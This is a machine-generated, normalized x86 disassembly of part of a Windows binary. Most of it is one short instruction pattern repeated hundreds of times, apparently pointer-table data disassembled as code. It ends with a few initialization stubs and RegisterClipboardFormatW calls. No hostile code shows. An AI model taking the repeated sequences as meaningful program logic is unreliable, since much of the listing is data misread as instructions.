dec edx
add [ eax ] bh
0x4a
sub_4aa078
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa080
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa088
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa090
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa0c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa0c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa0d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa0d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa0e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa0e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa0f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa0f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa100
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa108
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa110
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa118
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa120
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa128
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa130
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa138
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa140
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa148
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa150
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa158
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa160
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa168
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa170
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa178
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa180
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa188
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa190
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa198
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa1f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa200
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa208
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa210
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa218
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa220
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa228
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa230
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa238
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa240
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa248
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa250
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa258
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa260
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa268
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa270
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa278
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa280
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa288
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa290
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa298
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa2f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa300
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa308
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa310
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa318
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa320
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa328
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa330
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa338
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa340
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa348
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa350
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa358
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa360
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa368
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa374
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa37c
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4aa388
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa390
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa398
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3b0
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa3f4
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4aa400
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa408
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa410
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa418
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa420
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa428
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa430
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa438
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa440
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa448
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa450
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa458
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa460
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa468
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa470
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa478
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa480
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa488
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa490
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa498
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4b8
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4aa4c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4dc
lodsb [ esi ]
jae r-xdata
cmp dl cl
dec edx
add [ eax ] bh
0x4a
add [ eax ] bh
0x4a
sub_4aa4e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa4fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa504
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa50c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa514
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa51c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa52c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa534
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa53c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa544
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa54c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa554
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa55c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa564
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa56c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa574
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa57c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa584
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa58c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa594
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa59c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5a4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5ac
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5b4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa5fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa604
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa60c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa614
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ edi * 2 - 0x35c7ffbb ] bl
dec edx
add [ eax ] bh
0x4a
sub_4aa628
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa630
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa638
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa640
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa648
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa650
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa658
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa660
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa668
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa670
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa678
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa680
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa688
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa690
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa698
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6b0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6b8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6c0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6c8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6d0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6d8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6e0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6e8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6f0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa6f8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa700
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa708
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa710
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa718
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa720
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa728
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa730
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa738
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa740
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa748
add [ eax ] eax
add [ eax ] al
test [ edx ] cl
inc esp
add [ eax ] bh
0x4a
sub_4aa754
mov esp 0x3800440a
0x4a
sub_4aa75c
cmp dl cl
dec edx
add ah dh
or al [ eax + eax + 0x30 ]
or eax [ eax + eax + 0x38 ]
0x4a
sub_4aa76c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa774
cmp dl cl
dec edx
add [ eax + 0xb ] dh
inc esp
add [ eax ] ah
or al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4aa788
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa794
add [ eax ] eax
add [ eax ] al
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7a0
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7a8
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7b0
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4aa7bc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7c4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7cc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7d4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7dc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7e4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7ec
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7f4
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa7fc
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa804
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa80c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa814
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa81c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa824
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa82c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa834
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa83c
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa844
cmp dl cl
dec edx
add [ eax ] bh
0x4a
sub_4aa84c
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4aa858
cmp dl cl
dec edx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
0x4a
sub_4ab0ac
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40c7a8
xor eax eax
mov [ rw-data ] eax
sub_4ab0c4
sub [ rw-data ] 0x1
retn
sub_4ab0cc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_416e84
sub_4ab15a
jmp sub_405fd0
sub_4ab161
pop ebp
retn
sub_4ab16b
inc [ edx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] bh
add [ eax ] al
add [ eax ] al
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_41a824
sub_4ab229
jmp sub_405fd0
sub_4ab230
pop ebp
retn
sub_4ab234
sub [ rw-data ] 0x1
retn
sub_4ab23c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_43af48
sub_4ab2d0
jmp sub_405fd0
sub_4ab2d7
pop ebp
retn
sub_4ab2dc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x0
mov [ rw-data ] 0x80000000
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0x7fffffff
sub_4ab310
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_43f7dc
sub_4ab320
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f390
mov [ rw-data ] eax
sub_4ab33c
sub [ rw-data ] 0x1
retn
sub_4ab344
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_443250
j_sub_405fd0#2
jmp sub_405fd0
sub_4ab7a6
mov esp ebp
pop ebp
retn
sub_4ab7ac
sub [ rw-data ] 0x1
retn
sub_4ab7b4
sub [ rw-data ] 0x1
retn
sub_4ab7bc
sub [ rw-data ] 0x1
retn
sub_4ab948
sub [ rw-data ] 0x1
retn
sub_4ab950
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatW
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatW
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_4aba98
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4585b0
j_sub_405fd0
jmp sub_405fd0
sub_4abbb6
pop ebp
retn
sub_4abbb8
sub [ rw-data ] 0x1
retn
sub_4abbc0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_42fa50
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_42fa50
